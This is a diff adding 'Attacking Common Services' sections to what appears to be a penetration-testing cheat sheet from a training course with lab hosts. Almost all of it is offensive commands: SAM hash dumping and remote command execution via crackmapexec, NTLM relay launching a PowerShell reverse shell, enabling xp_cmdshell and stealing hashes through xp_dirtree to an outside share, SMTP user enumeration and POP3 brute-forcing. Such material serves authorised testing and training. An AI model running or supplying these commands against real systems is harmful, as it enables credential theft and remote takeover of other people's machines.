@@ -312,3 +312,66 @@ hashcat -m 1800 -a 0 /tmp/unshadowed.hashes rockyou.txt -o /tmp/unshadowed.crack
 # Runs Office2john.py against a protected .docx file and converts it to a hash stored in a file called protected-docx.hash.
 office2john.py Protected.docx > protected-docx.hash
 ```
+## Attacking Common Services
+
+##### Attacking SMB
+
+```
+# Network share enumeration using smbmap.
+smbmap -H 10.129.14.128
+
+# Null-session with the rpcclient.
+rpcclient -U'%' 10.10.110.17
+
+# Execute a command over the SMB service using crackmapexec.
+crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec
+
+# Extract hashes from the SAM database.
+crackmapexec smb 10.10.110.17 -u administrator -p 'Password123!' --sam
+
+# Dump the SAM database using impacket-ntlmrelayx.
+impacket-ntlmrelayx --no-http-server -smb2support -t 10.10.110.146
+
+# Execute a PowerShell based reverse shell using impacket-ntlmrelayx.
+impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.220.146 -c 'powershell -e <base64 reverse shell>
+```
+##### Attacking SQL
+```
+# SQLEXPRESS
+EXECUTE sp_configure 'show advanced options', 1
+EXECUTE sp_configure 'xp_cmdshell', 1
+RECONFIGURE
+xp_cmdshell 'whoami'
+
+# Hash stealing using the xp_dirtree command in MSSQL.
+EXEC master..xp_dirtree '\\10.10.110.17\share\'
+
+# Hash stealing using the xp_subdirs command in MSSQL.
+EXEC master..xp_subdirs '\\10.10.110.17\share\'
+
+# Identify the user and its privileges used for the remote connection in MSSQL.
+EXECUTE('select @@servername, @@version, system_user, is_srvrolemember(''sysadmin'')') AT [10.0.0.12\SQLEXPRESS]
+```
+##### Attacking Email Services
+```
+# DNS lookup for mail servers for the specified domain
+host -t MX microsoft.com
+
+#  DNS lookup for mail servers for the specified domain
+dig mx inlanefreight.com | grep "MX" | grep -v ";"
+
+#  DNS lookup of the IPv4 address for the specified subdomain.
+host -t A mail1.inlanefreight.htb.
+
+# Connect to the SMTP server.
+telnet 10.10.110.20 25
+
+# SMTP user enumeration using the RCPT command against the specified host
+smtp-user-enum -M RCPT -U userlist.txt -D inlanefreight.htb -t 10.129.203.7
+
+# Brute-forcing the POP3 service.
+hydra -L users.txt -p 'Company01!' -f 10.10.110.20 pop3
+
+# Testing the SMTP service for the open-relay vulnerability.
+swaks --from notifications@inlanefreight.com --to employees@inlanefreight.com --header 'Subject: Notification' --body 'Message' --server 10.10.11.213
+```
